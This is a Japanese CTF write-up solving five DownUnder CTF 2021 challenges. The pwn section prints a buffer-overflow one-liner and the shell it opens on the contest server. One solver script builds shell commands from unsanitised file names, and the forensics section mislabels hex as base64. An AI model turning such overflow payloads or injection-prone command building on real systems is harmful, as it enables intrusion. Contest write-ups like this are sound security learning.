---
title: "DownUnder CTF 2021 Writeup"
date: 2021-09-26T22:00:00+09:00
lastmod: 2021-09-26T22:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdownunder_ctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://play.duc.tf/challenges](https://play.duc.tf/challenges)
<br /><br />

1410点を獲得し、372位でした。

<br><br>

<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_Score1.png" alt="downunder_CTF_2021_Score1.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_Score2.png" alt="downunder_CTF_2021_Score2.png">


<br><br>
チャレンジのリストです。

<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_chall1.png" alt="downunder_CTF_2021_chall1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_chall2.png" alt="downunder_CTF_2021_chall2.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/downunder_CTF_2021_chall3.png" alt="downunder_CTF_2021_chall3.png">

<br>



<br /><br />
## [Misc]: General Skills Quiz (100 points)
- - -
### Challenge
> QUIZ TIME! Just answer the questions. Pretty easy right?
<br /><br />
nc pwn-2021.duc.tf 31905


<br />

### Solution
書いたコード。

{{< highlight powershell "linenos=table,hl_lines=16 17" >}}
#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
from urllib.parse import unquote
import base64
import codecs

s = remote('pwn-2021.duc.tf', 31905)

s.sendlineafter(b"Press enter when you are ready to start your 30 seconds timer for the quiz...", b"")
s.sendlineafter(b"Answer this maths question: 1+1=?\n", b"2")

s.recvuntil(b"Decode this hex string and provide me the original number (base 10): ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
# s.sendline(str(int(msg,16)))
s.sendline(bytes(str(int(msg,16)), 'utf-8'))

s.recvuntil(b"Decode this hex string and provide me the original ASCII letter: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(bytes(chr(int(msg,16)), 'utf-8'))

s.recvuntil(b"Decode this URL encoded string and provide me the original ASCII symbols: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(bytes(unquote(msg), 'utf-8'))

s.recvuntil(b"Decode this base64 string and provide me the plaintext: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(base64.b64decode(msg))

s.recvuntil(b"Encode this plaintext string and provide me the Base64: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(base64.b64encode(bytes(msg, 'ascii')))

s.recvuntil(b"Decode this rot13 string and provide me the plaintext: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(bytes(codecs.decode(msg, 'rot13'), 'utf-8'))

s.recvuntil(b"Encode this plaintext string and provide me the ROT13 equilavent: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(bytes(codecs.decode(msg, 'rot13'), 'utf-8'))

s.recvuntil(b"Decode this binary string and provide me the original number (base 10): ")
msg = s.recvline()[2:-1].decode("utf-8")
print(msg)
s.sendline(bytes(str(int(msg,2)), 'utf-8'))

s.recvuntil(b"Encode this number and provide me the binary equivalent: ")
msg = s.recvline()[:-1].decode("utf-8")
print(msg)
s.sendline(bytes(bin(int(msg)), 'utf-8'))

s.sendlineafter(b"Final Question, what is the best CTF competition in the universe?", b"DUCTF")

msg = s.recvall()
print(msg.decode("utf-8"))
{{< / highlight >}}


<br />
ハイライト部分で、以下のWarning対策をしてます。

<pre>
./General_Skills_Quiz_solve.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  s.sendline(str(int(msg,16)))
</pre>



<br />

Flag: `DUCTF{you_aced_the_quiz!_have_a_gold_star_champion}`



<br /><br />
<br /><br />
## [Misc]: rabbit (100 points)
- - -
### Challenge
> Can you find Babushka's missing vodka? It's buried pretty deep, like 1000 steps, deep.
<br /><br />

Attachment:

- flag.txt


<br />

### Solution

flag.txtは、bzip2で圧縮されたファイルでした。

<pre>
$ file flag.txt
flag.txt: bzip2 compressed data, block size = 900k
</pre>

<br />

一度解凍してみると、次に7zで圧縮されたファイルが出てきたので、繰り返し解凍を行うチャレンジのようです。

これは、[SarCTF by Saratov State University 2020 の Deep dive](https://captureamerica.github.io/writeups/post/sarctf_2020/#misc-deep-dive) というチャレンジで過去にやってます。

SarCTFのWriteupの時にはコードは載せなかったんですが（あんまり良いSolutionじゃなかったので）、今回は載せちゃおうかと思います。

VMで動かしているUbuntuだと、うまくいかなかったので、Mac上で動かしました（Python2）。これでもいちおう解けるんですが、途中で1、2回止まったりしてたので、あんまりオススメじゃありません。。

```Python
#!/usr/bin/env python
# Usage:
# watch -n 1 "./rabbit_solve.py flag.txt"

import os
from sys import argv
from time import sleep

filename = argv[1]

cmd = "file " + filename
fout = os.popen(cmd)
result = fout.read()
print(result)

if "POSIX tar archive" in result:
    filename2 = filename + ".tar"
    cmd = "mv " + filename + " " + filename2
    fout = os.popen(cmd)
    sleep(1)
    cmd = "tar xvf " + filename2
    fout = os.popen(cmd)
    print(cmd)

if "Zip archive data" in result:
    filename2 = filename + ".zip"
    cmd = "mv " + filename + " " + filename2
    fout = os.popen(cmd)
    sleep(1)
    cmd = "unzip " + filename2
    fout = os.popen(cmd)
    print(cmd)

if "bzip2 compressed data" in result:
    filename2 = filename + ".bz2"
    cmd = "mv " + filename + " " + filename2
    fout = os.popen(cmd)
    sleep(1)
    cmd = "bzip2 -d " + filename2
    print(cmd)
    fout = os.popen(cmd)
    cmd = "touch " + filename2
    fout = os.popen(cmd)

if "gzip compressed data" in result:
    filename2 = filename + ".gz"
    cmd = "mv " + filename + " " + filename2
    fout = os.popen(cmd)
    sleep(1)
    cmd = "gunzip " + filename2
    fout = os.popen(cmd)
    print(cmd)
    cmd = "touch " + filename2
    fout = os.popen(cmd)

if "XZ compressed data" in result:
    filename2 = filename + ".xz"
    cmd = "mv " + filename + " " + filename2
    fout = os.popen(cmd)
    sleep(1)
    cmd = "tar -J -xf " + filename2
    fout = os.popen(cmd)
    print(cmd)

while 1:
    cmd = "ls -l"
    fout = os.popen(cmd)
    result = fout.read()
    print(result)
    if "flag.txt\n" in result:
        break
    sleep(1)

cmd = "rm " + filename2
fout = os.popen(cmd)
```

<br />
SarCTFの復習をした時、[st98さんのブログ](https://st98.github.io/diary/posts/2020-02-17-sarctf.html)を見てました。今回のやつもほぼ同じコードで解けるようです。こちらのやり方の方がスマートですね。

今回はXZが出てくるので、その部分の追加は必要です。

以下、追加分だけ。

```Python
import lzma
:
(snip)
:
  elif s[3:5] == b'XZ':
    with lzma.open('tmp.bin', 'r') as xz:
      with open('flag.txt', 'wb') as f:
        f.write(xz.read())
```



<br />

Flag: `DUCTF{babushkas_v0dka_was_h3r3}`



<br /><br />
<br /><br />
## [Forensics]: That's Not My Name (100 points)
- - -
### Challenge
> I think some of my data has been stolen, can you help me?

Attachment:

- notmyname.pcapng


<br />

### Solution
タイトルからしてDNSが怪しいです。

tsharkを使ってDNSクエリーを取り出してみると、どうもDNS tunnelを使った通信がありそうです。
<pre>
$ tshark -r notmyname.pcapng -Y "dns" -T fields -e "dns.qry.name"
</pre>

<br />
DNS tunnelではbase64が使われているので、`DUCTF{`をbase64でエンコードした`44554354467b`を使ってgrepしてみます。

<pre>
$ tshark -r notmyname.pcapng -Y "dns" -T fields -e "dns.qry.name" | grep 44554354467b
09fe012309643e95030000001c8003000344554354467b6334745f673037.5f793075725f6e346d337d.qawesrdtfgyhuj.xyz
09fe012309643e95030000001c8003000344554354467b6334745f673037.5f793075725f6e346d337d.qawesrdtfgyhuj.xyz
</pre>

あとは、base64でデコードするとフラグが得られます。

<br />

Flag: `DUCTF{c4t_g07_y0ur_n4m3}`


<br /><br />
<br /><br />
## [Pwn]: deadcode (100 points)
- - -
### Challenge
> I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.
<br /><br />
nc pwn-2021.duc.tf 31916

Attachment:

- deadcode (ELF 64bit)

<br />

### Solution
単なるBOFのチャレンジですが、今回新たに分かったことがあったので記録しておきます。

まずは、Ghidraにかけてコードを確認します。

```C
undefined8 main(void)

{
  char local_28 [24];
  long local_10;
  
  local_10 = 0;
  buffer_init();
  puts(
      "\nI\'m developing this new application in C, I\'ve setup some code for the new features but it\'s not (a)live yet."
      );
  puts("\nWhat features would you like to see in my app?");
  gets(local_28);
  if (local_10 == 0xdeadc0de) {
    puts("\n\nMaybe this code isn\'t so dead...");
    system("/bin/sh");
  }
  return 0;
}
```

<br />

ワンライナーで解こうと思って以下を実行しましたが、成功しませんでした。

<pre>
(python -c 'print("A"*24+"\xde\xc0\xad\xde\x00\x00\x00\x00")' ; cat - ) | nc pwn-2021.duc.tf 31916
</pre>

<br />
実はここのところ、ワンライナーで失敗することが多く、「pwntoolsで解けるからいいや」と思ってスルーしてたんですが、今回ちょっと調べてみました。

hexdumpを使って調べてみると、全く期待していないデータが出ていることが判明。。。ちょっとびっくり。
<pre>
$ (python -c 'print("A"*24+"\xde\xc0\xad\xde\x00\x00\x00\x00")' ; cat - ) | hexdump -C
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  c3 9e c3 80 c2 ad c3 9e  |AAAAAAAA........|
</pre>

<br />
ググって調べたところ、これ Python3 だとこうなっちゃうらしいです。知らなかった... orz

<br />
正解は以下。こっちは改行が自動で入らないので、自分で`b"\n"`を入れてます。

<pre>
$ (python -c 'import sys; sys.stdout.buffer.write(b"A"*24 + b"\xde\xc0\xad\xde\x00\x00\x00\x00"+b"\n")'; cat - ) | nc pwn-2021.duc.tf 31916

I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.

What features would you like to see in my app?


Maybe this code isn't so dead...
ls
flag.txt
pwn
cat flag.txt
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
</pre>

<br />

Flag: `DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`


<br /><br />
<br /><br />
## [OSINT]: Get over it! (100 points)
- - -
### Challenge
> Bridget loves bridges, this one is her favourite.
<br /><br />
What is the name of it and the length of its main span to the nearest metre?
<br /><br />
Flag format; DUCTF{the_bridge_name-1337m}

Attachment:

- get-over-it.jpg

<img src="https://captureamerica.github.io/writeups/img/get-over-it.jpg" alt="get-over-it.jpg">


<br />

### Solution
先日あった [TsukuCTF](https://fans.sechack365.com/ctf/tsukuctf2021/) (少ししか参加してないのでブログは書いてません) で、OSINTには Google Lens というのが使えることを習ったので、Android Phoneを取り出して Google Lens アプリをインストールして使ってみました。

見つかった橋の写真のいくつかのうち、オーストラリアのものを見てみると（DownUnder CTFがオーストラリアのCTFであるため）、エレナー・ショネル・ブリッジ (Eleanor Schonell Bridge)のようです。長さはググったらわかります。

<br />

Flag: `DUCTF{Eleanor_Schonell_Bridge-185m}`




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
